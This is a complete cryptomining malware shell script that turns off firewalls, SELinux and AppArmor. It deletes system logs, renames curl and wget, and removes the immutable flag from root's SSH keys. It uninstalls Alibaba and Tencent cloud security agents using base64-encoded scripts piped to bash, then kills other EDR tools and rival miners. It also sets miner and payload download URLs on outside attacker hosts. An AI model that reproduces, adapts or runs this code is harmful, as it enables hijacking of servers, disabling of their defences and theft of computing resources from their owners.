#!/bin/sh
ulimit -n 65535
chmod 777 /usr/bin/chattr
chmod 777 /bin/chattr
chattr -iua /tmp/
chattr -iua /var/tmp/
iptables -F
ufw disable
echo '0' >/proc/sys/kernel/nmi_watchdog
echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf
chattr -iae /root/.ssh/
chattr -iae /root/.ssh/authorized_keys
chattr -iua /tmp/
chattr -iua /var/tmp/
rm -rf /tmp/addres*
rm -rf /tmp/walle*
rm -rf /tmp/keys
rm -rf /var/log/syslog
setenforce 0 2>dev/null
echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
sync && echo 3 >/proc/sys/vm/drop_caches

crondir='/var/spool/cron/'"$USER"
cont=`cat ${crondir}`
ssht=`cat /root/.ssh/authorized_keys`
echo 1 > /etc/zzhs
rtdir="/etc/zzhs"
bbdir="/usr/bin/curl"
bbdira="/usr/bin/cd1"
ccdir="/usr/bin/wget"
ccdira="/usr/bin/wd1"

mv /usr/bin/wgettnt /usr/bin/wd1
mv /usr/bin/curltnt /usr/bin/cd1
mv /usr/bin/wget1 /usr/bin/wd1
mv /usr/bin/curl1 /usr/bin/cd1
mv /usr/bin/cur /usr/bin/cd1
mv /usr/bin/cdl /usr/bin/cd1
mv /usr/bin/cdt /usr/bin/cd1
mv /usr/bin/xget /usr/bin/wd1
mv /usr/bin/wge /usr/bin/wd1
mv /usr/bin/wdl /usr/bin/wd1
mv /usr/bin/wdt /usr/bin/wd1
mv /usr/bin/wget /usr/bin/wd1
mv /usr/bin/curl /usr/bin/cd1

if ps aux | grep -i '[a]liyun'; then
  $bbdir http://update.aegis.aliyun.com/download/uninstall.sh | bash
  $bbdir http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
  $bbdira http://update.aegis.aliyun.com/download/uninstall.sh | bash
  $bbdira http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
  echo 'IyEvYmluL2Jhc2gKCkFFR0lTX0lOU1RBTExfRElSPSIvdXNyL2xvY2FsL2FlZ2lzIgojY2hlY2sgbGludXggR2VudG9vIG9zIAp2YXI9YGxzYl9yZWxlYXNlIC1hIHwgZ3JlcCBHZW50b29gCmlmIFsgLXogIiR7dmFyfSIgXTsgdGhlbiAKCXZhcj1gY2F0IC9ldGMvaXNzdWUgfCBncmVwIEdlbnRvb2AKZmkKY2hlY2tDb3Jlb3M9YGNhdCAvZXRjL29zLXJlbGVhc2UgMj4vZGV2L251bGwgfCBncmVwIGNvcmVvc2AKaWYgWyAtZCAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdCIgLWEgLW4gIiR7dmFyfSIgXTsgdGhlbgoJTElOVVhfUkVMRUFTRT0iR0VOVE9PIgplbGlmIFsgLWYgIi9ldGMvb3MtcmVsZWFzZSIgLWEgLW4gIiR7Y2hlY2tDb3Jlb3N9IiBdOyB0aGVuCglMSU5VWF9SRUxFQVNFPSJDT1JFT1MiCglBRUdJU19JTlNUQUxMX0RJUj0iL29wdC9hZWdpcyIKZWxzZSAKCUxJTlVYX1JFTEVBU0U9Ik9USEVSIgpmaQkJCgpzdG9wX2FlZ2lzX3BraWxsKCl7CiAgICBwa2lsbCAtOSBBbGlZdW5EdW4gPi9kZXYvbnVsbCAyPiYxCiAgICBwa2lsbCAtOSBBbGlIaWRzID4vZGV2L251bGwgMj4mMQogICAgcGtpbGwgLTkgQWxpSGlwcyA+L2Rldi9udWxsIDI+JjEKICAgIHBraWxsIC05IEFsaU5ldCA+L2Rldi9udWxsIDI+JjEKICAgIHBraWxsIC05IEFsaVNlY0d1YXJkID4vZGV2L251bGwgMj4mMQogICAgcGtpbGwgLTkgQWxpWXVuRHVuVXBkYXRlID4vZGV2L251bGwgMj4mMQogICAgCiAgICAvdXNyL2xvY2FsL2FlZ2lzL0FsaU5ldC9BbGlOZXQgLS1zdG9wZHJpdmVyCiAgICAvdXNyL2xvY2FsL2FlZ2lzL2FsaWhpcHMvQWxpSGlwcyAtLXN0b3Bkcml2ZXIKICAgIC91c3IvbG9jYWwvYWVnaXMvQWxpU2VjR3VhcmQvQWxpU2VjR3VhcmQgLS1zdG9wZHJpdmVyCiAgICBwcmludGYgIiUtNDBzICU0MHNcbiIgIlN0b3BwaW5nIGFlZ2lzIiAiWyAgT0sgIF0iCn0KCiMgY2FuIG5vdCByZW1vdmUgYWxsIGFlZ2lzIGZvbGRlciwgYmVjYXVzZSB0aGVyZSBpcyBiYWNrdXAgZmlsZSBpbiBnbG9iYWxjZmcKcmVtb3ZlX2FlZ2lzKCl7Cmtwcm9iZUFycj0oCiAgICAiL3N5cy9rZXJuZWwvZGVidWcvdHJhY2luZy9pbnN0YW5jZXMvYWVnaXNfZG9fc3lzX29wZW4vc2V0X2V2ZW50IgogICAgIi9zeXMva2VybmVsL2RlYnVnL3RyYWNpbmcvaW5zdGFuY2VzL2FlZ2lzX2luZXRfY3NrX2FjY2VwdC9zZXRfZXZlbnQiCiAgICAiL3N5cy9rZXJuZWwvZGVidWcvdHJhY2luZy9pbnN0YW5jZXMvYWVnaXNfdGNwX2Nvbm5lY3Qvc2V0X2V2ZW50IgogICAgIi9zeXMva2VybmVsL2RlYnVnL3RyYWNpbmcvaW5zdGFuY2VzL2FlZ2lzL3NldF9ldmVudCIKICAgICIvc3lzL2tlcm5lbC9kZWJ1Zy90cmFjaW5nL2luc3RhbmNlcy9hZWdpc18vc2V0X2V2ZW50IgogICAgIi9zeXMva2VybmVsL2RlYnVnL3RyYWNpbmcvaW5zdGFuY2VzL2FlZ2lzX2FjY2VwdC9zZXRfZXZlbnQiCiAgICAiL3N5cy9rZXJuZWwvZGVidWcvdHJhY2luZy9rcHJvYmVfZXZlbnRzIgogICAgIi91c3IvbG9jYWwvYWVnaXMvYWVnaXNfZGVidWcvdHJhY2luZy9zZXRfZXZlbnQiCiAgICAiL3Vzci9sb2NhbC9hZWdpcy9hZWdpc19kZWJ1Zy90cmFjaW5nL2twcm9iZV9ldmVudHMiCikKZm9yIHZhbHVlIGluICR7a3Byb2JlQXJyW0BdfQpkbwogICAgaWYgWyAtZiAiJHZhbHVlIiBdOyB0aGVuCiAgICAgICAgZWNobyA+ICR2YWx1ZQogICAgZmkKZG9uZQppZiBbIC1kICIke0FFR0lTX0lOU1RBTExfRElSfSIgXTt0aGVuCiAgICB1bW91bnQgJHtBRUdJU19JTlNUQUxMX0RJUn0vYWVnaXNfZGVidWcKICAgIGlmIFsgLWQgIiR7QUVHSVNfSU5TVEFMTF9ESVJ9L2Nncm91cC9jcHUiIF07dGhlbgogICAgICAgIHVtb3VudCAke0FFR0lTX0lOU1RBTExfRElSfS9jZ3JvdXAvY3B1CiAgICBmaQogICAgaWYgWyAtZCAiJHtBRUdJU19JTlNUQUxMX0RJUn0vY2dyb3VwIiBdO3RoZW4KICAgICAgICB1bW91bnQgJHtBRUdJU19JTlNUQUxMX0RJUn0vY2dyb3VwCiAgICBmaQogICAgcm0gLXJmICR7QUVHSVNfSU5TVEFMTF9ESVJ9L2FlZ2lzX2NsaWVudAogICAgcm0gLXJmICR7QUVHSVNfSU5TVEFMTF9ESVJ9L2FlZ2lzX3VwZGF0ZQoJcm0gLXJmICR7QUVHSVNfSU5TVEFMTF9ESVJ9L2FsaWhpZHMKICAgIHJtIC1yZiAke0FFR0lTX0lOU1RBTExfRElSfS9nbG9iYWxjZmcvZG9tYWluY2ZnLmluaQpmaQp9Cgp1bmluc3RhbGxfc2VydmljZSgpIHsKICAgCiAgIGlmIFsgLWYgIi9ldGMvaW5pdC5kL2FlZ2lzIiBdOyB0aGVuCgkJL2V0Yy9pbml0LmQvYWVnaXMgc3RvcCAgPi9kZXYvbnVsbCAyPiYxCgkJcm0gLWYgL2V0Yy9pbml0LmQvYWVnaXMgCiAgIGZpCgoJaWYgWyAkTElOVVhfUkVMRUFTRSA9ICJHRU5UT08iIF07IHRoZW4KCQlyYy11cGRhdGUgZGVsIGFlZ2lzIGRlZmF1bHQgMj4vZGV2L251bGwKCQlpZiBbIC1mICIvZXRjL3J1bmxldmVscy9kZWZhdWx0L2FlZ2lzIiBdOyB0aGVuCgkJCXJtIC1mICIvZXRjL3J1bmxldmVscy9kZWZhdWx0L2FlZ2lzIiA+L2Rldi9udWxsIDI+JjE7CgkJZmkKICAgIGVsaWYgWyAtZiAvZXRjL2luaXQuZC9hZWdpcyBdOyB0aGVuCiAgICAgICAgIC9ldGMvaW5pdC5kL2FlZ2lzICB1bmluc3RhbGwKCSAgICBmb3IgKCh2YXI9MjsgdmFyPD01OyB2YXIrKykpIGRvCgkJCWlmIFsgLWQgIi9ldGMvcmMke3Zhcn0uZC8iIF07dGhlbgoJCQkJIHJtIC1mICIvZXRjL3JjJHt2YXJ9LmQvUzgwYWVnaXMiCgkJICAgIGVsaWYgWyAtZCAiL2V0Yy9yYy5kL3JjJHt2YXJ9LmQiIF07dGhlbgoJCQkJcm0gLWYgIi9ldGMvcmMuZC9yYyR7dmFyfS5kL1M4MGFlZ2lzIgoJCQlmaQoJCWRvbmUKICAgIGZpCgp9CgpzdG9wX2FlZ2lzX3BraWxsCnVuaW5zdGFsbF9zZXJ2aWNlCnJlbW92ZV9hZWdpcwp1bW91bnQgJHtBRUdJU19JTlNUQUxMX0RJUn0vYWVnaXNfZGVidWcKCgpwcmludGYgIiUtNDBzICU0MHNcbiIgIlVuaW5zdGFsbGluZyBhZWdpcyIgICJbICBPSyAgXSIKCgoK' | base64 -d | bash
  echo 'IyEvYmluL2Jhc2gKCiNjaGVjayBsaW51eCBHZW50b28gb3MgCnZhcj1gbHNiX3JlbGVhc2UgLWEgfCBncmVwIEdlbnRvb2AKaWYgWyAteiAiJHt2YXJ9IiBdOyB0aGVuIAoJdmFyPWBjYXQgL2V0Yy9pc3N1ZSB8IGdyZXAgR2VudG9vYApmaQoKaWYgWyAtZCAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdCIgLWEgLW4gIiR7dmFyfSIgXTsgdGhlbgoJTElOVVhfUkVMRUFTRT0iR0VOVE9PIgplbHNlCglMSU5VWF9SRUxFQVNFPSJPVEhFUiIKZmkKCnN0b3BfYWVnaXMoKXsKCWtpbGxhbGwgLTkgYWVnaXNfY2xpID4vZGV2L251bGwgMj4mMQoJa2lsbGFsbCAtOSBhZWdpc191cGRhdGUgPi9kZXYvbnVsbCAyPiYxCglraWxsYWxsIC05IGFlZ2lzX2NsaSA+L2Rldi9udWxsIDI+JjEKICAgIHByaW50ZiAiJS00MHMgJTQwc1xuIiAiU3RvcHBpbmcgYWVnaXMiICJbICBPSyAgXSIKfQoKc3RvcF9xdWFydHooKXsKCWtpbGxhbGwgLTkgYWVnaXNfcXVhcnR6ID4vZGV2L251bGwgMj4mMQogICAgICAgIHByaW50ZiAiJS00MHMgJTQwc1xuIiAiU3RvcHBpbmcgcXVhcnR6IiAiWyAgT0sgIF0iCn0KCnJlbW92ZV9hZWdpcygpewppZiBbIC1kIC91c3IvbG9jYWwvYWVnaXMgXTt0aGVuCiAgICBybSAtcmYgL3Vzci9sb2NhbC9hZWdpcy9hZWdpc19jbGllbnQKICAgIHJtIC1yZiAvdXNyL2xvY2FsL2FlZ2lzL2FlZ2lzX3VwZGF0ZQpmaQp9CgpyZW1vdmVfcXVhcnR6KCl7CmlmIFsgLWQgL3Vzci9sb2NhbC9hZWdpcyBdO3RoZW4KCXJtIC1yZiAvdXNyL2xvY2FsL2FlZ2lzL2FlZ2lzX3F1YXJ0egpmaQp9CgoKdW5pbnN0YWxsX3NlcnZpY2UoKSB7CiAgIAogICBpZiBbIC1mICIvZXRjL2luaXQuZC9hZWdpcyIgXTsgdGhlbgoJCS9ldGMvaW5pdC5kL2FlZ2lzIHN0b3AgID4vZGV2L251bGwgMj4mMQoJCXJtIC1mIC9ldGMvaW5pdC5kL2FlZ2lzIAogICBmaQoKCWlmIFsgJExJTlVYX1JFTEVBU0UgPSAiR0VOVE9PIiBdOyB0aGVuCgkJcmMtdXBkYXRlIGRlbCBhZWdpcyBkZWZhdWx0IDI+L2Rldi9udWxsCgkJaWYgWyAtZiAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdC9hZWdpcyIgXTsgdGhlbgoJCQlybSAtZiAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdC9hZWdpcyIgPi9kZXYvbnVsbCAyPiYxOwoJCWZpCiAgICBlbGlmIFsgLWYgL2V0Yy9pbml0LmQvYWVnaXMgXTsgdGhlbgogICAgICAgICAvZXRjL2luaXQuZC9hZWdpcyAgdW5pbnN0YWxsCgkgICAgZm9yICgodmFyPTI7IHZhcjw9NTsgdmFyKyspKSBkbwoJCQlpZiBbIC1kICIvZXRjL3JjJHt2YXJ9LmQvIiBdO3RoZW4KCQkJCSBybSAtZiAiL2V0Yy9yYyR7dmFyfS5kL1M4MGFlZ2lzIgoJCSAgICBlbGlmIFsgLWQgIi9ldGMvcmMuZC9yYyR7dmFyfS5kIiBdO3RoZW4KCQkJCXJtIC1mICIvZXRjL3JjLmQvcmMke3Zhcn0uZC9TODBhZWdpcyIKCQkJZmkKCQlkb25lCiAgICBmaQoKfQoKc3RvcF9hZWdpcwpzdG9wX3F1YXJ0egp1bmluc3RhbGxfc2VydmljZQpyZW1vdmVfYWVnaXMKcmVtb3ZlX3F1YXJ0egoKcHJpbnRmICIlLTQwcyAlNDBzXG4iICJVbmluc3RhbGxpbmcgYWVnaXNfcXVhcnR6IiAgIlsgIE9LICBdIgoKCgo=' | base64 -d | bash
  pkill aliyun-service
  rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
  rm -rf /usr/local/aegis*
  systemctl stop aliyun.service
  systemctl disable aliyun.service
  service bcm-agent stop
  yum remove bcm-agent -y
  apt-get remove bcm-agent -y
elif ps aux | grep -i '[y]unjing'; then
  /usr/local/qcloud/stargate/admin/uninstall.sh
  /usr/local/qcloud/YunJing/uninst.sh
  /usr/local/qcloud/monitor/barad/admin/uninstall.sh
fi


if [ -f /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh ]; then
  /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh stop && /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh remove && rm -rf /usr/local/cloudmonitor  
else
  export ARCH=amd64
  if [ -f /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCH} ]; then
    /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCH} stop && /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCH} uninstall && rm -rf /usr/local/cloudmonitor 
  else
    echo "ali cloud monitor not running"
  fi
fi


setenforce 0
echo SELINUX=disabled >/etc/selinux/config
service apparmor stop
systemctl disable apparmor
service aliyun.service stop
systemctl disable aliyun.service
ps aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'aegis' | awk '{print $11}' | xargs  dirname  | xargs  rm -rf
ps aux | grep -v grep | grep 'hids' | awk '{print $11}' | xargs  dirname  | xargs  rm -rf
ps aux | grep -v grep | grep 'cloudwalker' | awk '{print $11}' | xargs  dirname  | xargs  rm -rf
ps aux | grep -v grep | grep 'titanagent' | awk '{print $11}' | xargs  dirname  | xargs  rm -rf
ps aux | grep -v grep | grep 'edr' | awk '{print $2}' | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep 'hids' | awk '{print $2}' | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep 'edr' | awk '{print $2}' | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep 'cloudwalker' | awk '{print $2}' | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep 'titanagent' | awk '{print $2}' | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep 'sgagent' | awk '{print $2}' | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep 'barad_agent' | awk '{print $2}' | xargs  -I {}  kill -9 {}
ps aux | grep -v grep | grep 'hostguard' | awk '{print $2}' | xargs  -I {}  kill -9 {}

rm -rf /usr/local/aegis

miner_url="http://45.83.123.29/cleanfda/zzh"
miner_url_backup="http://en2an.top/cleanfda/zzh"
miner_size="2269048"
sh_url="http://45.83.123.29/cleanfda/newinit.sh"
sh_url_backup="http://en2an.top/cleanfda/newinit.sh"
chattr_size="8000"

sleep 1

if [ -x "$(command -v t)" ]; then
mv /usr/bin/t /usr/bin/chattr
fi

if [ -x "$(command -v chattr)" ]; then
chattr -i /usr/bin/ip6network
chattr -i /usr/bin/kswaped
chattr -i /usr/bin/irqbalanced
chattr -i /usr/bin/rctlcli
chattr -i /usr/bin/systemd-network
chattr -i /usr/bin/pamdicks
echo 1 > /usr/bin/ip6network
echo 2 > /usr/bin/kswaped
echo 3 > /usr/bin/irqbalanced
echo 4 > /usr/bin/rctlcli
echo 5 > /usr/bin/systemd-network
echo 6 > /usr/bin/pamdicks
chattr +i /usr/bin/ip6network
chattr +i /usr/bin/kswaped
chattr +i /usr/bin/irqbalanced
chattr +i /usr/bin/rctlcli
chattr +i /usr/bin/systemd-network
chattr +i /usr/bin/pamdicks
fi
sleep 1

rm -f /tmp/.null 2>/dev/null
echo 128 > /proc/sys/vm/nr_hugepages
sysctl -w vm.nr_hugepages=128

kill_miner_proc()
{
netstat -anp | grep 194.87.139.103 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 %
netstat -anp | grep 185.71.65.238 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 %
netstat -anp | grep 140.82.52.87 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 %
netstat -anp | grep :23 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :143 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :2222 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :3333 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :3389 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :5555 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :6666 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :6665 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :6667 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :7777 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :8444 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :3347 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :10008 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
ps.original aux | grep -v grep | grep ':13531' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep ':3333' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep ':5555' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kworker -c\' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'log_' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'systemten' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'netns' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'voltuned' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'darwin' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/dl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/ddg' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/pprt' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/ppol' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/65ccE*' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/jmx*' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/2Ne80*' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'IOFoqIgyC0zmf2UR' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '45.76.122.92' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '51.38.191.178' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '51.15.56.161' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '86s.jpg' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'aGTSGJJp' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'nMrfmnRa' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'PuNY5tm2' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'I0r8Jyyt' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'AgdgACUD' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'uiZvwxG8' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'hahwNEdB' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'BtwXn5qH' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '3XEzey2T' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 't2tKrCSZ' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'HD7fcBgg' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'zXcDajSs' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '3lmigMo' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'AkMK4A2' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'AJ2AkKe' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'HiPxCJRS' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'http_0xCC030' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'http_0xCC031' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'http_0xCC032' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'http_0xCC033' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "C4iLM4L" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'aziplcr72qjhzvin' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | awk '{ if(substr($11,1,2)=="./" && substr($12,1,2)=="./") print $2 }' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/boot/vmlinuz' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "i4b503a52cc5" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "dgqtrcst23rtdi3ldqk322j2" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "2g0uv7npuhrlatd" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "nqscheduler" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "rkebbwgqpl4npmm" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v aux | grep "]" | awk '$3>10.0{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "2fhtu70teuhtoh78jc5s" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "0kwti6ut420t" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "44ct7udt0patws3agkdfqnjm" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v "/" | grep -v "-" | grep -v "_" | awk 'length($11)>19{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "\[^" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "rsync" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "watchd0g" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | egrep 'wnTKYg|2t3ik|qW3xT.2|ddg' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "158.69.133.18:8220" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "/tmp/java" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'gitee.com' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/java' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '104.248.4.162' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '89.35.39.78' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/dev/shm/z3.sh' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kthrotlds' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'ksoftirqds' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'netdns' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'watchdogs' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kdevtmpfsi' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kinsing' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'redis2' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v aux | grep " ps" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "sync_supers" | cut -c 9-15 | xargs -I % kill -9 %
ps aux | grep -v grep | grep "cpuset" | cut -c 9-15 | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v aux | grep "x]" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v aux | grep "sh] <" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep -v aux | grep " \[]" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/l.sh' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/zmcat' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'hahwNEdB' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'CnzFVPLF' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'CvKzzZLs' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'aziplcr72qjhzvin' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/udevd' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'KCBjdXJsIC1vIC0gaHR0cDovLzg5LjIyMS41Mi4xMjIvcy5zaCApIHwgYmFzaCA' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'Y3VybCAtcyBodHRwOi8vMTA3LjE3NC40Ny4xNTYvbXIuc2ggfCBiYXNoIC1zaAo' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'sustse' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'sustse3' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'mr.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'mr.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '2mr.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '2mr.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'cr5.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'cr5.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'logo9.jpg' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'logo9.jpg' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'j2.conf' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'luk-cpu' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'luk-cpu' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'ficov' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'ficov' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
